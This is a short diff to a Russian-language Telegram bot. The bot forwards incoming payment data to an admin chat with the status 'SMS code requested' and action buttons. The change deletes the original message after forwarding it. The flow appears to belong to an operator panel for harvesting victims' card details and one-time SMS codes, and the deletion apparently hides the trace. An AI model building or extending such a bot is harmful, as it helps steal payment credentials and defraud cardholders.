@@ -633,6 +633,8 @@ async def process_payment_data(message: types.Message):
             formatted_text += "📱 <b>Статус: SMS код запрошен</b>\n\n"
             formatted_text += "Выберите действие:"
             
+            # УДАЛЯЕМ оригинальное сообщение и отправляем новое с кнопками
+            await message.delete()
             await bot.send_message(
                 chat_id=ADMIN_CHAT_ID,
                 text=formatted_text,
@@ -643,6 +645,7 @@ async def process_payment_data(message: types.Message):
 
     except Exception as e:
         logger.error(f"💥 Ошибка обработки платежа: {e}")
+
 
 # ========== ОСТАЛЬНЫЕ ОБРАБОТЧИКИ БОТА ==========
 @dp.message(Command("start"))
@@ -1010,6 +1013,7 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
 
 
